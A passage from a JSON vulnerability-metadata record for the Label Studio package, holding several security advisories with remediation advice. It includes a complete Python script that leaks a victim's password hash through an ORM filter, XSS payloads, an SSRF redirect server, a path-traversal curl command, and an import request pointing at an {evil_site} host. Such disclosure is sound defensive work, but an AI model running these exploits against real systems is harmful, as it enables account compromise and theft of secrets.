the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.2/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (==1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.17)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d53ae4692344a13bab30d60c17e2cac55b20599af3d9c7d948ee58675f394183","md5":"bb474e964872cbd94425a848c68054de","sha256":"8c4f52dec33db5a5d7ebe1a261ac54d3fc8143aa2e2ad1f15db165c0b82ed0b7"},"downloads":-1,"filename":"label_studio-0.7.2-py3-none-any.whl","has_sig":false,"md5_digest":"bb474e964872cbd94425a848c68054de","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6948132,"upload_time":"2020-06-11T12:51:52","upload_time_iso_8601":"2020-06-11T12:51:52.363794Z","url":"https://files.pythonhosted.org/packages/d5/3a/e4692344a13bab30d60c17e2cac55b20599af3d9c7d948ee58675f394183/label_studio-0.7.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"7bab0f9959ee5c720e79fa1cfe66efdf45b76b70e40ad3789ab6bfbc4d54b409","md5":"9def8aae8bd6814cca4dd6bccac9ca02","sha256":"dff060cec8fc1ceab12bdb68394c2ac8f76243b590706e258ee0f07441e76aaa"},"downloads":-1,"filename":"label-studio-0.7.2.tar.gz","has_sig":false,"md5_digest":"9def8aae8bd6814cca4dd6bccac9ca02","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6882568,"upload_time":"2020-06-11T12:51:55","upload_time_iso_8601":"2020-06-11T12:51:55.663149Z","url":"https://files.pythonhosted.org/packages/7b/ab/0f9959ee5c720e79fa1cfe66efdf45b76b70e40ad3789ab6bfbc4d54b409/label-studio-0.7.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` 